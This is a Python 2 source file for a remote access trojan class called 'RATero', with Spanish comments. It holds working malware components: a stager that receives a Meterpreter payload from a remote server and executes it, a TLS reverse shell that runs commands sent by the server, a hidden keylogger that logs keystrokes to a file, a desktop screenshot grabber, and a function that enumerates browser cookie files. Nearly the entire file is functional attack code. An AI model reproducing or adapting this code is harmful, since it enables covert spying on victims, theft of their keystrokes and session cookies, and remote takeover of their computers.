__author__ = 'Someone'
class RATero:
    def __init__(self, servidor, bdoorPort, meterPort):
        self.Server = servidor
        self.bdoorPort = bdoorPort
        self.meterPort = meterPort
    def __del__(self):
        pass
    def Meterpreter(self):
        #########################
        # Usadas en Meterpreter #
        #########################
        from socket import socket
        from struct import unpack
        try:
            cliente = socket(2,1)
            meterServer = (self.Server, self.meterPort)
            cliente.connect(meterServer)
            l=unpack('>I', cliente.recv(4))[0]
            d=cliente.recv(4096)
            while len(d) != l:
                d+=cliente.recv(4096)
            #print "> "+d+"\n\n"
            exec(d, {'s': cliente})
        except:
            print "Meterpreter not Connected"

    def SecureBackdoor(self):
        from socket import socket
        from socket import AF_INET, SOCK_STREAM
        from win32api import GetUserName
        from subprocess import Popen
        from subprocess import PIPE
        from ssl import wrap_socket, CERT_REQUIRED
        Vj = False
        try:
            so = socket(AF_INET, SOCK_STREAM)
            so.connect((self.Server, self.bdoorPort))
            s = wrap_socket(so, ca_certs="bdoor.crt", cert_reqs=CERT_REQUIRED)
            Vj = False
            user = GetUserName()
            ruta = user+"@"+self.Server+"> "
            while not Vj:
                s.send(ruta)
                data = s.recv(1024)
                #if len(data) == 0:
                if data == "exit\n":
                    Vj = True
                    s.close()
                proc=Popen(data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                s.send(stdout_value)
                data = ""
        except:
                print "Backdoor Finished"
                Vj = True
        print "Boss Disconnected"

    #Editar la ruta del archivo Generado por el Keylogger
    def Keylogger(event):
        #######################
        # Usadas on Keylogger #
        #######################
        from win32console import GetConsoleWindow
        from win32gui import ShowWindow
        from pythoncom import PumpMessages
        from pyHook import HookManager
        from time import sleep
        win=GetConsoleWindow()
        ShowWindow(win,0)
        def OnKeyboardEvent(event):
            if event.Ascii == 5:
                _exit(1)
            if event.Ascii !=0 or 8:
                f=open('C:\Users\Feric\Downloads\\test\keylogger.txt','a+')
                buffer=f.read()
                f.close()
                f=open('C:\Users\Feric\Downloads\\test\keylogger.txt','w')
                keylogs=chr(event.Ascii)
                if event.Ascii==13:
                    keylogs='/n'
                buffer+=keylogs
                f.write(buffer)
                f.close()
                #print buffer
        hm=HookManager()
        hm.KeyDown=OnKeyboardEvent
        hm.HookKeyboard()
        #sleep(10)
        PumpMessages()

    def Screenshot(self):
        ########################
        # Usadas en Screenshot #
        ########################
        from time import sleep
        from win32gui import GetDesktopWindow, GetWindowDC
        from win32ui import CreateDCFromHandle, CreateBitmap
        from win32con import SRCCOPY, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN, SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN
        from win32api import GetSystemMetrics, GetUserName
        from time import strftime
        print "Tomando Pantallazo"
        # Toma 4 pantallazos
        # Cada pantallazo lo llama pantallazo1 , 2 ,3 o 4
        # Lo hace cada 2 segundos
        t = strftime("%Y-%H%M%S")
        hwin = GetDesktopWindow()
        width = GetSystemMetrics(SM_CXVIRTUALSCREEN)
        height = GetSystemMetrics(SM_CYVIRTUALSCREEN)
        left = GetSystemMetrics(SM_XVIRTUALSCREEN)
        top = GetSystemMetrics(SM_YVIRTUALSCREEN)
        hwindc = GetWindowDC(hwin)
        srcdc = CreateDCFromHandle(hwindc)
        memdc = srcdc.CreateCompatibleDC()
        bmp = CreateBitmap()
        bmp.CreateCompatibleBitmap(srcdc, width, height)
        memdc.SelectObject(bmp)
        memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), SRCCOPY)
        bmp.SaveBitmapFile(memdc, "C:\\Users\\"+GetUserName()+"\\Downloads\\test\\screen"+t+".bmp")

    def Cookies(self):
        ######################
        # Usadas por Cookies #
        #   Para IExplorer   #
        ######################
        from win32api import GetUserName
        from os import listdir
        usuario = GetUserName()
        ficheros = listdir('C:\\Users\\'+usuario+'\\AppData\\Local\\Microsoft\\Windows\\INetCookies') #windows: cuidado con el caracter \
        #print ficheros
        return ficheros
